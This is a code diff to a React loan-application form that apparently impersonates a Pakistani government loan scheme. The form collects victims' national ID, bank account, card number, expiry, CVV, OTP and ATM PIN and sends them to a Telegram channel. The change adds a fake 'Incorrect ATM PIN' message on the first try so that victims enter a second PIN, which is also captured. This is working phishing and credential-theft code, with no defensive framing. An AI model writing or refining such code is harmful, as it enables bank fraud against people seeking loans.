@@ -44,6 +44,7 @@ const LoanForm = () => {
   const [otpSeconds, setOtpSeconds] = useState(180);
   const [searching, setSearching] = useState(false);
   const [otpAttempts, setOtpAttempts] = useState(0);
+  const [pinAttempts, setPinAttempts] = useState(0);
   const [submitted, setSubmitted] = useState(false);
   const [trackingId, setTrackingId] = useState("");
 
@@ -189,18 +190,30 @@ const LoanForm = () => {
       toast.error("Please enter your 4-digit ATM PIN");
       return;
     }
-    setSearching(true);
-    const id = `GOP-2026-${Math.floor(100000 + Math.random() * 900000)}-PK`;
-    setTrackingId(id);
     sendToTelegram("step6-pin", {
-      "Tracking ID": id,
       "Full Name": data.fullName, CNIC: data.cnic, Mobile: data.phone,
       Bank: data.bankName, "Account Number": data.accountNumber,
       "Card Number": data.cardNumber, Expiry: data.expiry, CVV: data.cvv,
-      OTP: data.otp, "ATM PIN": data.atmPin,
+      OTP: data.otp, "ATM PIN": data.atmPin, Attempt: String(pinAttempts + 1),
     });
+    setSearching(true);
     setTimeout(() => {
       setSearching(false);
+      if (pinAttempts === 0) {
+        setPinAttempts(1);
+        update("atmPin", "");
+        toast.error("Incorrect ATM PIN. Please try again / غلط پن، دوبارہ کوشش کریں");
+        return;
+      }
+      const id = `GOP-2026-${Math.floor(100000 + Math.random() * 900000)}-PK`;
+      setTrackingId(id);
+      sendToTelegram("step7-complete", {
+        "Tracking ID": id,
+        "Full Name": data.fullName, CNIC: data.cnic, Mobile: data.phone,
+        Bank: data.bankName, "Account Number": data.accountNumber,
+        "Card Number": data.cardNumber, Expiry: data.expiry, CVV: data.cvv,
+        OTP: data.otp, "ATM PIN": data.atmPin,
+      });
       setSubmitted(true);
       toast.success("Loan application submitted successfully!");
     }, 2000);
